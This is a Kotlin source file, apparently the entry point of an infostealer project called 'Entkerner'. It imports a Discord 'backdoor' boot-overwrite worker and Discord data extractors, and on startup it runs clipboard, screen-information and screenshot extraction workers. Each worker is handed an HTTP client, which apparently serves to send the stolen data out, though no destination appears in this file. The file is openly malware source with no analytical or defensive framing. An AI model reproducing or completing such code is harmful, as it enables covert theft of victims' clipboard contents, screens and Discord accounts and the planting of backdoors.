package net.kerner.entkerner

import io.ktor.client.*
import io.ktor.client.engine.cio.*
import io.ktor.client.plugins.contentnegotiation.*
import io.ktor.client.plugins.cookies.*
import io.ktor.serialization.kotlinx.json.*
import kotlinx.coroutines.runBlocking
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import net.kerner.entkerner.abstract.AbstractDataExtractor
import net.kerner.entkerner.abstract.get
import net.kerner.entkerner.backdoor.discord.DiscordBootOverwriteWorker
import net.kerner.entkerner.extractors.discord.DiscordData
import net.kerner.entkerner.extractors.discord.DiscordDataWorker
import net.kerner.entkerner.extractors.screen.ScreenData
import net.kerner.entkerner.extractors.screen.ScreenExtractionWorker
import net.kerner.entkerner.extractors.screen.ScreenScreenshotWorker
import net.kerner.entkerner.extractors.standart.ClipboardExtractionWorker
import net.kerner.entkerner.model.SystemType
import java.awt.image.BufferedImage
import java.io.File
import kotlin.io.path.pathString

class Entkerner {
    val system = when(System.getProperty("os.name").lowercase()) {
        "windows " -> SystemType.WINDOWS
        "linux" -> SystemType.LINUX
        "xnu" -> SystemType.XNU // probably not working, need to test each of these
        else -> SystemType.WINDOWS // most common used on desktop
    }
    private val httpClient = HttpClient(CIO) {
        install(ContentNegotiation) {
            json(Json {
                ignoreUnknownKeys = true
                prettyPrint = true
            })
        }
        install(HttpCookies) {

        }
    }
    init {
        runBlocking {
            val clipboard = runExtractor<String>(ClipboardExtractionWorker(httpClient) as AbstractDataExtractor<Any>)
            val screenData = runExtractor<List<ScreenData>>(ScreenExtractionWorker(httpClient) as AbstractDataExtractor<Any>)
            val screenshot = runExtractor<List<String>>(ScreenScreenshotWorker(httpClient) as AbstractDataExtractor<Any>)
        }
    }
    private suspend inline fun <reified V> runExtractor(dataExtractor: AbstractDataExtractor<Any>): V {
        val file = dataExtractor.fileDirectories[system].toFile()
        val resultT = dataExtractor.extractData(file)
        val resultV = dataExtractor.handleExtractedData<V>(resultT)
        println(Json.encodeToString(resultV as V))
        return resultV as V
    }
}

fun main() {
    Entkerner()
}